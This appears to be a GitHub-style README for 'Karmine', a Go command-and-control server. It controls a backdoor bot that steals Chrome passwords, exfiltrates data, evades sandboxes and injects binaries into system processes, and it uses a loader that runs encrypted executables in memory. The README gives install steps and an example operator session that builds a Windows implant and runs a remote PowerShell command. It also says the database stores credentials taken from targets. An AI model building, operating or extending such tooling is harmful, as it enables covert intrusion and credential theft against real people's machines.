# Karmine

Karmine is a C2 server written in Go. It handles requests from a bot/backdoor ('Karma'), which has built-in dropping, exfiltration and anti-analysis / sandboxing features. All communication happens over mTLS, with transferred objects AES-encrypted to avoid detection. Karma instances are run using a loader, 'Karl', which reads encrypted PEs written to disk, decrypts and runs them in memory.

## Setup 

1. Run `install.sh` in the project root. This will set up configuration files, the `bin`, a x509 certificate-key pair, and a database. You can replace these with your own by replacing the ones in `~/.kdots/` with files of the same name.

## Usage 

### Example

```
$  new karma --os windows --interval 3
'karma' saved to /home/pygrum/karmine/bin


$  profiles view

uuid                                 | name         | strain
------------------------------------------------------------
181d70e4-cbc6-4bfd-9e96-7ccb31dbbc27 | 3a89aee34882 | karma

$  stage cmd --for 3a89aee34882 exec "powershell -c whoami /priv"
$  % 3a89aee34882 %  127.0.0.1:1337 ---
INFO[1139] exec powershell -c whoami /priv               type=cmd
INFO[1139] 
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
```

The Karmine database logs all staged commands, active strains, and credentials from targets. In-built commands can be used to view this information.

### Commands

As of March 15 2023, there are 3 commands:
- `new`
- `profiles`
- `stage`

To get usage info about these commands, type `<command> --help`

## Karma

Karma is a bot with backdoor functionality, capable of executing shell commands, stealing chrome passwords, and injecting remote binaries into legitimate system processes. It communicates over a secure mTLS connection, and supports threaded processing and execution of commands. 
